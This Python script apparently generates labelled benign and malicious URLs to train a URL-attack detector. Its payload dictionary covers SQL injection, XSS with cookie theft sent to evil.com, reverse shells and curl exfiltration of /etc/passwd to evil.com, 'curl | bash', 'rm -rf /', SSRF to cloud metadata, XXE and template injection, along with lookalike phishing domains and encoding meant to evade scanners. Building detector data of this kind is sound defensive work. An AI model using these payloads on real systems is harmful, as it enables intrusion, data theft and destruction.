import json
import sys
import os
import numpy as np
import re
import random
import csv
import time
from urllib.parse import urlparse, parse_qs, quote

# Constants
OUTPUT_DIR = "microservices/training_data"
TRAINING_FILE = f"{OUTPUT_DIR}/url_training_data.json"
CSV_FILE = f"{OUTPUT_DIR}/url_training_data.csv"

# Ensure output directory exists
if not os.path.exists(OUTPUT_DIR):
    os.makedirs(OUTPUT_DIR, exist_ok=True)
    print(f"Created directory: {OUTPUT_DIR}")

# Real-world domain components - for more realistic data
REAL_DOMAINS = [
    "google.com", "microsoft.com", "apple.com", "amazon.com", "facebook.com",
    "youtube.com", "twitter.com", "instagram.com", "linkedin.com", "netflix.com",
    "spotify.com", "github.com", "stackoverflow.com", "medium.com", "cnn.com",
    "nytimes.com", "bbc.com", "reuters.com", "wikipedia.org", "pinterest.com",
    "ebay.com", "walmart.com", "shopify.com", "paypal.com", "adobe.com",
    "salesforce.com", "slack.com", "zoom.us", "dropbox.com", "airbnb.com",
    "uber.com", "lyft.com", "doordash.com", "grubhub.com", "instacart.com"
]

BENIGN_PATHS = [
    "/", "/index.html", "/about", "/contact", "/products", "/services", 
    "/blog", "/news", "/faq", "/help", "/support", "/login", "/register",
    "/dashboard", "/account", "/settings", "/profile", "/search", "/terms",
    "/privacy", "/cart", "/checkout", "/orders", "/api/v1/users", "/docs",
    "/download", "/pricing", "/team", "/careers", "/investors", "/partners",
    "/events", "/resources", "/gallery", "/store", "/shop", "/categories",
    "/learn", "/community", "/forum", "/feedback", "/status", "/health"
]

BENIGN_PARAMS = [
    "id", "page", "limit", "offset", "q", "query", "search", "filter", "sort",
    "order", "view", "layout", "mode", "lang", "locale", "region", "country",
    "utm_source", "utm_medium", "utm_campaign", "ref", "source", "category",
    "tag", "type", "format", "version", "start", "end", "date", "time",
    "price", "min", "max", "color", "size", "width", "height", "depth",
    "login", "secure", "verify", "token"  # Added suspicious keywords
]

# Attack patterns (more comprehensive than the original)
ATTACK_PATTERNS = {
    "sql_injection": [
        "' OR 1=1 --", "' OR '1'='1", "1' OR '1'='1", "' OR 1=1/*",
        "admin'--", "1'; DROP TABLE users; --", "' UNION SELECT * FROM users --",
        "1'; INSERT INTO users VALUES ('hacker','password'); --",
        "' OR 1=1 LIMIT 1; --", "' OR username LIKE '%admin%'",
        "'; EXEC xp_cmdshell('net user'); --", "' OR ascii(substring((SELECT password FROM users WHERE username='admin'),1,1))>0 --",
        "' UNION ALL SELECT NULL, concat(table_name) FROM information_schema.tables --",
        "' AND (SELECT 1 FROM (SELECT count(*),concat(version(),floor(rand(0)*2))x FROM information_schema.tables GROUP BY x)a) --",
        "admin' AND 1=(SELECT COUNT(*) FROM tabname); --"
    ],
    "xss": [
        "<script>alert('XSS')</script>", "<img src='x' onerror='alert(\"XSS\")'>",
        "<body onload='alert(\"XSS\")'></body>", "<svg/onload=alert('XSS')>",
        "javascript:alert('XSS')", "<iframe src='javascript:alert(`XSS`)'></iframe>",
        "\"><script>alert(document.cookie)</script>", "'\"><img src=x onerror=alert('XSS')>",
        "<div style=\"background-image: url(javascript:alert('XSS'))\">",
        "<input type=\"text\" value=\"\" onfocus=\"alert('XSS')\">",
        "<a href=\"javascript:alert('XSS')\">Click me</a>",
        "<script>fetch('https://evil.com/steal?cookie='+document.cookie)</script>",
        "<script>var img=new Image(); img.src=\"https://evil.com/\"+document.cookie;</script>",
        "<svg><animate onbegin=alert('XSS') attributeName=x></animate></svg>",
        "<marquee onstart=alert('XSS')>XSS</marquee>"
    ],
    "path_traversal": [
        "../../../etc/passwd", "..%2f..%2f..%2fetc%2fpasswd", "....//....//etc/passwd",
        "..\\..\\..\\windows\\system32\\cmd.exe", "%252e%252e%252fetc%252fpasswd",
        "/var/www/../../etc/passwd", "../../../../etc/hosts", "%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd",
        "file:///etc/passwd", "/proc/self/environ", "/proc/self/cmdline", 
        "/proc/self/fd/1", "/dev/fd/1", "php://filter/convert.base64-encode/resource=index.php",
        "php://input", "zip://malicious.zip#sensitive.txt", "data:text/plain;base64,aGVsbG8="
    ],
    "command_injection": [
        "; ls -la", "& dir", "| cat /etc/passwd", "`id`", "$(whoami)",
        "; ping -c 4 evil.com", "| nc evil.com 4444", "&& curl -d @/etc/passwd evil.com",
        "; bash -i >& /dev/tcp/evil.com/4444 0>&1", "; python -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"evil.com\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"]);'",
        "|| wget http://evil.com/backdoor -O /tmp/backdoor", "; curl evil.com/script.sh | bash",
        "; echo 'evil:x:0:0::/root:/bin/bash' >> /etc/passwd", "; rm -rf /",
        "' ; id #", "\"; id #"
    ],
    "prototype_pollution": [
        "__proto__[admin]=true", "constructor.prototype.admin=true",
        "__proto__.isAdmin=true", "constructor.constructor('alert(1)')())",
        "constructor.prototype.toString=()=>{alert(1)}", 
        "__lookupGetter__('x')", "__defineGetter__('x',function(){return SockJS})",
        "__proto__[innerHTML]=<img/src/onerror=alert(1)>",
        "constructor.prototype.filteredProperty=alert(1)",
        "constructor.constructor.prototype.toString=()=>{alert(document.cookie)}",
        "__proto__.isVulnerable='<img src=x onerror=alert(1)>'",
        "__proto__.source=data:,alert(1)",
        "__proto__.value.toString=()=>alert(1)",
        "__proto__.url=javascript:alert(1)",
        "__proto__.path=['constructor','constructor']"
    ],
    "deserialization": [
        "rO0ABXNyABNqYXZhLnV0aWwuQXJyYXlMaXN0eIHSHZnHYZ0DAAFJAARzaXpleHA=", 
        "O:8:\"stdClass\":1:{s:4:\"test\";O:8:\"stdClass\":1:{s:4:\"test\";s:4:\"test\";}}",
        "YToxOntzOjg6ImNsYXNzbmFtZSI7czo2OiJTeXN0ZW0iO30=",
        "Tzo5OiJQYWdlTW9kZWwiOjE6e3M6NToiZmlsZXMiO2E6Mjp7aTowO3M6MTQ6InBocDovL2ZpbHRlci9pZCI7aToxO3M6MjI6InBocDovL2ZpbHRlci9yZWFkPWV2YWwiO319",
        "eyAiZXhwIjogIjE1NTg0NjQ2ODEiLCAicGF5bG9hZCI6IHsiX19DT05TVFJVQ1RPUl9fIjogInByb2Nlc3MiLCJzdGRvdXQiOnsid3JpdGUiOiJ0ZXN0In0sImNvbnN0cnVjdG9yIjp7InJ1biI6ImVjaG8gJ3Z1bG5lcmFibGUnOyJ9fX0=",
        "eyJyY2UiOiJfJF9GVU5DVC1fMyggJ3Rlc3QnICkiLCJwaHAiOiI8P3BocCBwaHBpbmZvKCk7Pz4ifQ==",
        "gAR9cQAoWAkAAABfX2NsYXNzX19xAVgCAAAAb3NxAlgKAAAAX19tb2R1bGVfX3EDaAJYAwAAAHN5c3EDWAgAAABfX2luaXRfX3EEWAkAAABwb3Blbih7fSlxBVgGAAAAaW5pdF9fcQZoBXUu",
        "AAEAAAD//////////wAAAAD/////AAAAAAEAAAD/////AAAAAP////8AAAAA/////wAAAAD/////AAAkdmXs"
    ],
    "jwt_manipulation": [
        "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWV9.",
        "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c",
        "eyJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJqb2UiLCJwZXJtaXNzaW9uIjoiYWRtaW4ifQ.signature",
        "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6IjEyMzQ1Njc4OTAiLCJuYW1lIjoiQWRtaW4iLCJhZG1pbiI6dHJ1ZSwiaWF0IjoxNjAzMTMyNTA1fQ.Y0M_wkxFhK5ne66I8O3wO7URcq_2gVvP5-8fsrCv5L4",
        "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJyb2xlIjoiYWRtaW4iLCJpYXQiOjE1MTYyMzkwMjJ9.sG-zDZLnGf4xU9JbB4-9Xo2Q-sfaQ4dSAcbG1aq9EeU"
    ],
    "ssrf": [
        "http://localhost:3000/internal-api", "https://127.0.0.1/admin",
        "http://0.0.0.0:8080/metrics", "http://10.0.0.1/network-config",
        "http://169.254.169.254/latest/meta-data/", "http://[::1]:22/", 
        "http://2130706433/", "http://017700000001", "http://0x7f.0x0.0x0.0x1",
        "file:///etc/passwd", "dict://localhost:5432/", "gopher://localhost:25/",
        "http://metadata.google.internal/computeMetadata/v1/", 
        "http://instance-data.ec2.internal/latest/meta-data/",
        "http://webhook.site?data="+quote("http://169.254.169.254/latest/meta-data/")
    ],
    "open_redirect": [
        "/redirect?url=https://evil.com", "/login?next=https://evil.com",
        "/logout?redirect_to=https://evil.com", "/connect?redirect=https://evil.com",
        "/auth/callback?return_url=https://evil.com", "/sso?service=https://evil.com",
        "/?url=javascript:alert(document.cookie)", "/redirect?url=data:text/html,<script>alert(1)</script>",
        "/redirect?url=%2F%2Fevil.com", "/redirect?url=//%5C%5Cevil.com",
        "/url?q=https://evil.com%23https://legitimate.com", "/redirect?url=https://legitimate.com@evil.com"
    ],
    "crlf_injection": [
        "%0D%0ASet-Cookie: sessionid=INJECT", "%0D%0AContent-Length:0%0D%0A%0D%0AHTTP/1.1 200 OK%0D%0A",
        "%0D%0ALocation: https://evil.com", "%0D%0AContent-Type: text/html%0D%0A%0D%0A<script>alert(1)</script>",
        "%E5%98%8D%E5%98%8ASet-Cookie:csrf_token=INJECT", "%0D%0AX-XSS-Protection: 0%0D%0A%0D%0A<script>alert(1)</script>",
        "%0d%0aContent-Security-Policy:%20default-src%20%27self%27",
        "%0d%0aX-Frame-Options:%20ALLOWALL%0d%0a", "%0d%0aAccess-Control-Allow-Origin:%20evil.com%0d%0a",
        "%0D%0ASet-Cookie:%20malicious=1;%20httpOnly"
    ],
    "nosql_injection": [
        "username[$ne]=admin&password[$ne]=", "username[$gt]=&password[$gt]=",
        "login[$regex]=adm.*&password[$ne]=", "email[$regex]=admin.*&password[$exists]=true",
        "{\"$where\": \"sleep(5000)\"}", "{\"username\": {\"$in\": [\"admin\"]}}",
        "{\"$where\": \"this.password == this.passwordConfirm\"}",
        "admin'; return this.a == 'admin' || '1'=='1", "admin'; return this.a == 'admin' && this.b.match(/.*/)|| '1'=='1",
        "username=admin&password[$ne]=whatever", "user[$exists]=true&pass[$exists]=true",
        r"{\"$gt\":\"\"}",  r"?arg=db.find({$where: function(){while(1){}}})"
    ],
    "xxe": [
        "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>",
        "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM \"https://evil.com/steal.php?data=\">]><foo>&xxe;</foo>",
        "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"http://evil.com/evil.dtd\">%xxe;]>",
        "<?xml version=\"1.0\"?><!DOCTYPE data [<!ENTITY file SYSTEM \"file:///etc/passwd\">]><data>&file;</data>",
        "<?xml version=\"1.0\"?><!DOCTYPE data [<!ENTITY % dtd SYSTEM \"http://attacker.com/evil.dtd\">%dtd;%all;]>",
        "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY % remote SYSTEM \"http://evil.com/evil.dtd\">%remote;]>",
        "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY test SYSTEM 'file:///etc/passwd'>]><root>&test;</root>",
        "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"php://filter/convert.base64-encode/resource=/etc/passwd\">]><foo>&xxe;</foo>"
    ],
    "template_injection": [
        "{{7*7}}", "${7*7}", "<%= 7*7 %>", "#{7*7}", "${T(java.lang.Runtime).getRuntime().exec('ls')}",
        "{{config.__class__.__init__.__globals__['os'].system('ls')}}", "${\"freemarker\".template.utility.Execute(\"ls\")}",
        "{% for x in ().__class__.__base__.__subclasses__() %}{% if \"warning\" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').system(\"ls\")}}{% endif %}{% endfor %}",
        "${self.module.cache.util.os.system(\"ls\")}", "{{request.application.__globals__.__builtins__.__import__(\"os\").popen(\"ls\").read()}}",
        "{{_self.env.registerUndefinedFilterCallback(\"exec\")}}{{_self.env.getFilter(\"id\")}}",
        "<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"id\")}",
        "<%= Runtime.getRuntime().exec('ls') %>", "{{\"a\".constructor.prototype.charAt=[].join;$eval('x=1;#{process.mainModule.require(\"child_process\").exec(\"ls\")}');}}"
    ],
    "mass_assignment": [
        "user[admin]=true", "user[role]=admin", "account[permissions][]=admin",
        "profile[is_staff]=1", "order[price]=0", "user[is_verified]=true",
        "account[account_type]=premium", "product[price_override]=0",
        "settings[disable_security]=1", "user[role_id]=1",
        "customer[subscription_plan]=enterprise", "user[is_admin]=1",
        "post[author_id]=1", "student[grade]=A+", "user[password]=newpassword"
    ]
}

# Realistic benign URL components
def get_realistic_domain():
    """Returns a realistic domain based on real domains."""
    domain = random.choice(REAL_DOMAINS)
    
    # Sometimes add a subdomain
    if random.random() < 0.5:  # Increased probability
        subdomains = ["www", "api", "blog", "shop", "support", "help", "docs", 
                    "store", "developer", "m", "app", "mail", "cloud", "login",
                    "secure", "verify", "auth"]  # Added suspicious subdomains
        domain = f"{random.choice(subdomains)}.{domain}"
    
    return domain

def get_realistic_path():
    """Returns a realistic URL path."""
    path = random.choice(BENIGN_PATHS)
    
    # Add path depth sometimes
    if random.random() < 0.6:  # Increased probability
        depth = random.randint(1, 3)
        segments = []
        for _ in range(depth):
            segment_options = ["products", "categories", "articles", "pages", "posts", 
                            "users", "items", "sections", "groups", "tags",
                            "login", "secure", "admin"]  # Added suspicious segments
            segments.append(random.choice(segment_options))
            # Sometimes add an ID
            if random.random() < 0.5:
                segments.append(str(random.randint(1, 9999)))
        
        path = f"{path}/{'/'.join(segments)}"
    
    # Add file extension sometimes
    if random.random() < 0.3 and not path.endswith(("/", ".html", ".php")):
        extensions = [".html", ".php", ".aspx", ".jsp", ".json", ".xml", ".pdf", ".txt"]
        path = f"{path}{random.choice(extensions)}"
    
    return path

def get_realistic_query():
    """Returns realistic query parameters."""
    if random.random() < 0.2:  # Reduced chance of no query
        return ""
    
    num_params = random.randint(1, 6)  # Increased max parameters
    params = []
    
    for _ in range(num_params):
        param = random.choice(BENIGN_PARAMS)
        
        # Generate appropriate values
        if param in ["id", "page", "limit", "offset"]:
            value = str(random.randint(1, 1000))
        elif param in ["q", "query", "search"]:
            search_terms = ["product", "how to", "best", "new", "review", "tutorial", 
                          "example", "help", "guide", "top", "latest",
                          "login", "secure", "admin"]  # Added suspicious terms
            value = random.choice(search_terms)
            if random.random() < 0.5:  # Increased probability
                value += f" {random.choice(search_terms)}"
        elif param in ["filter", "category", "tag", "type"]:
            categories = ["electronics", "clothing", "food", "books", "sports", 
                        "home", "garden", "toys", "beauty", "health"]
            value = random.choice(categories)
        elif param in ["sort", "order"]:
            value = random.choice(["asc", "desc", "newest", "popular", "price", "name"])
        elif param in ["utm_source", "source"]:
            sources = ["google", "facebook", "twitter", "email", "direct", 
                      "newsletter", "partner", "referral", "organic"]
            value = random.choice(sources)
        elif param in ["login", "secure", "verify", "token"]:
            value = "value" + str(random.randint(1, 100))
        else:
            value = "value" + str(random.randint(1, 100))
        
        # URL encode spaces
        value = value.replace(" ", "%20")
        params.append(f"{param}={value}")
    
    return f"?{'&'.join(params)}"

def generate_benign_url():
    """Generate a realistic benign URL."""
    domain = get_realistic_domain()
    path = get_realistic_path()
    query = get_realistic_query()
    
    # Sometimes add fragment
    fragment = ""
    if random.random() < 0.3:  # Increased probability
        fragments = ["top", "section1", "content", "main", "details", "summary", "faq",
                    "login", "secure"]  # Added suspicious fragments
        fragment = f"#{random.choice(fragments)}"
    
    # Use HTTPS most of the time
    protocol = "https://" if random.random() < 0.85 else "http://"
    
    return f"{protocol}{domain}{path}{query}{fragment}"

def generate_malicious_url():
    """Generate a malicious URL with a realistic attack pattern."""
    # Choose attack type and pattern
    attack_types = list(ATTACK_PATTERNS.keys())
    attack_type = random.choice(attack_types)
    attack_pattern = random.choice(ATTACK_PATTERNS[attack_type])
    
    # Obfuscate the attack pattern sometimes
    if random.random() < 0.5:  # 50% chance to obfuscate
        # URL encode some characters
        encoded = ""
        for char in attack_pattern:
            if random.random() < 0.3 and char.isalnum():
                encoded += f"%{ord(char):02x}"
            else:
                encoded += char
        attack_pattern = encoded
    if random.random() < 0.3:  # 30% chance to change case
        attack_pattern = ''.join(c.upper() if random.random() < 0.5 else c.lower() for c in attack_pattern)
    
    # Base domain - sometimes use legitimate-looking, sometimes suspicious
    if random.random() < 0.6:
        # Use suspicious domain
        suspicious_domains = [
            "login-secure-verify.com", "account-verification.net", "secure-login-auth.org",
            "banking-online-secure.com", "customer-support-help.net", "amazon-account-verify.com",
            "secure-payment-portal.net", "login-authentication.org", "paypal-account-confirm.com",
            "google-docs-share.net", "microsoft-login-secure.com", "apple-id-verify.net"
        ]
        domain = random.choice(suspicious_domains)
    else:
        # Use legitimate-looking domain but with a twist
        legit_domain = random.choice(REAL_DOMAINS)
        domain_variations = [
            f"secure-{legit_domain}", f"{legit_domain}-login.com", 
            f"{legit_domain.split('.')[0]}-account.com", f"verify-{legit_domain}",
            f"{legit_domain.replace('.', '-')}.net", f"{legit_domain.split('.')[0]}verify.com"
        ]
        domain = random.choice(domain_variations)
    
    # Sometimes use suspicious TLD
    if random.random() < 0.4:
        suspicious_tlds = ["xyz", "info", "top", "club", "pw", "cn", "ru", "tk", "ml", "ga", "cf"]
        domain_parts = domain.split('.')
        domain = f"{domain_parts[0]}.{random.choice(suspicious_tlds)}"
    
    # Construct appropriate path and query based on attack type
    if attack_type == "sql_injection":
        paths = ["/login.php", "/admin.php", "/user.php", "/profile.php", "/search.php"]
        path = random.choice(paths)
        query = f"?id={attack_pattern}" if "?" not in attack_pattern else f"?{attack_pattern}"
    
    elif attack_type == "xss":
        paths = ["/search", "/comment", "/profile", "/post", "/message"]
        path = random.choice(paths)
        query = f"?q={attack_pattern}" if "<" not in attack_pattern else f"?comment={attack_pattern}"
    
    elif attack_type == "path_traversal":
        paths = ["/download.php", "/view.php", "/file.php", "/read.php", "/display.php"]
        path = random.choice(paths)
        query = f"?file={attack_pattern}" if "?" not in attack_pattern else f"?{attack_pattern}"
    
    elif attack_type == "command_injection":
        paths = ["/execute", "/run", "/process", "/command", "/system"]
        path = random.choice(paths)
        query = f"?cmd=ping{attack_pattern}" if "?" not in attack_pattern else f"?{attack_pattern}"
    
    elif attack_type == "prototype_pollution":
        paths = ["/api/user", "/api/settings", "/api/config", "/api/profile", "/api/account"]
        path = random.choice(paths)
        query = f"?{attack_pattern}" if "?" not in attack_pattern else f"?{attack_pattern}"
    
    elif attack_type == "deserialization":
        paths = ["/api/data", "/deserialize", "/object", "/load", "/import"]
        path = random.choice(paths)
        query = f"?data={attack_pattern}" if "?" not in attack_pattern else f"?{attack_pattern}"
    
    elif attack_type == "jwt_manipulation":
        paths = ["/auth", "/login", "/verify", "/token", "/session"]
        path = random.choice(paths)
        query = f"?token={attack_pattern}" if "?" not in attack_pattern else f"?{attack_pattern}"
    
    elif attack_type == "ssrf":
        paths = ["/proxy", "/fetch", "/connect", "/request", "/load"]
        path = random.choice(paths)
        query = f"?url={attack_pattern}" if "?" not in attack_pattern else f"?{attack_pattern}"
    
    elif attack_type == "open_redirect":
        query = attack_pattern if "?" in attack_pattern else f"?redirect={attack_pattern}"
        path = "/redirect" if "redirect" not in query else "/login"
    
    elif attack_type == "crlf_injection":
        paths = ["/page", "/view", "/display", "/show", "/get"]
        path = random.choice(paths)
        query = f"?param={attack_pattern}" if "?" not in attack_pattern else f"?{attack_pattern}"
    
    elif attack_type == "nosql_injection":
        paths = ["/api/users", "/api/products", "/api/posts", "/api/comments", "/api/orders"]
        path = random.choice(paths)
        query = f"?{attack_pattern}" if "?" not in attack_pattern or "{" in attack_pattern else f"?query={attack_pattern}"
    
    elif attack_type == "xxe":
        paths = ["/api/import", "/upload", "/parse", "/process", "/convert"]
        path = random.choice(paths)
        # For XXE, we'll mimic sending it as a parameter, though in reality it would be in the request body
        query = f"?xml={quote(attack_pattern)}"
    
    elif attack_type == "template_injection":
        paths = ["/view", "/template", "/render", "/display", "/page"]
        path = random.choice(paths)
        query = f"?template={attack_pattern}" if "?" not in attack_pattern else f"?{attack_pattern}"
    
    elif attack_type == "mass_assignment":
        paths = ["/api/users", "/api/accounts", "/api/profiles", "/api/settings", "/api/orders"]
        path = random.choice(paths)
        query = f"?{attack_pattern}" if "?" not in attack_pattern else f"?{attack_pattern}"
    
    else:  # Default case
        path = "/index.php"
        query = f"?id={attack_pattern}"
    
    # Sometimes add encoding to evade detection
    if random.random() < 0.6:  # Increased probability
        encoded_parts = []
        for char in query:
            if random.random() < 0.4 and char.isalnum():  # Increased encoding
                encoded_parts.append(f"%{ord(char):02x}")
            else:
                encoded_parts.append(char)
        query = ''.join(encoded_parts)
    
    # Sometimes add fragment to confuse scanners
    fragment = ""
    if random.random() < 0.35:  # Increased probability
        fragments = ["#bypass", "#admin", "#true", "#1", "#success", "#payload"]
        fragment = random.choice(fragments)
    
    # Use HTTP more often for malicious URLs
    protocol = "http://" if random.random() < 0.65 else "https://"
    
    return f"{protocol}{domain}{path}{query}{fragment}"

def generate_training_data(num_samples=10000, malicious_ratio=0.5):
    """Generate comprehensive training data with balanced classes."""
    print(f"Generating {num_samples} training samples with {malicious_ratio*100}% malicious URLs...")
    
    benign_count = int(num_samples * (1 - malicious_ratio))
    malicious_count = num_samples - benign_count
    
    urls = []
    labels = []
    attack_types = []
    
    # Generate benign URLs
    for _ in range(benign_count):
        url = generate_benign_url()
        urls.append(url)
        labels.append(0)
        attack_types.append("benign")
    
    # Generate malicious URLs
    for _ in range(malicious_count):
        url = generate_malicious_url()
        urls.append(url)
        labels.append(1)
        # Extract attack type from the last generated malicious URL
        attack_type = next((key for key, patterns in ATTACK_PATTERNS.items() if any(p in url for p in patterns)), "unknown")
        attack_types.append(attack_type)
    
    # Shuffle the data
    data = list(zip(urls, labels, attack_types))
    random.shuffle(data)
    urls, labels, attack_types = zip(*data)
    
    # Prepare data for saving
    training_data = [
        {"url": url, "label": label, "attack_type": attack_type}
        for url, label, attack_type in zip(urls, labels, attack_types)
    ]
    
    # Save to JSON
    with open(TRAINING_FILE, 'w', encoding='utf-8') as f:
        json.dump(training_data, f, indent=2)
    print(f"Saved training data to {TRAINING_FILE}")
    
    # Save to CSV
    with open(CSV_FILE, 'w', newline='', encoding='utf-8') as f:
        writer = csv.writer(f)
        writer.writerow(['url', 'label', 'attack_type'])
        for item in training_data:
            writer.writerow([item['url'], item['label'], item['attack_type']])
    print(f"Saved training data to {CSV_FILE}")
    
    print(f"Generated {benign_count} benign and {malicious_count} malicious URLs")
    return urls, labels, attack_types

if __name__ == "__main__":
    # Generate training data when run as a script
    try:
        num_samples = int(sys.argv[1]) if len(sys.argv) > 1 else 10000
        malicious_ratio = float(sys.argv[2]) if len(sys.argv) > 2 else 0.5
        urls, labels, attack_types = generate_training_data(num_samples, malicious_ratio)
    except Exception as e:
        print(f"Error: {str(e)}")
        sys.exit(1)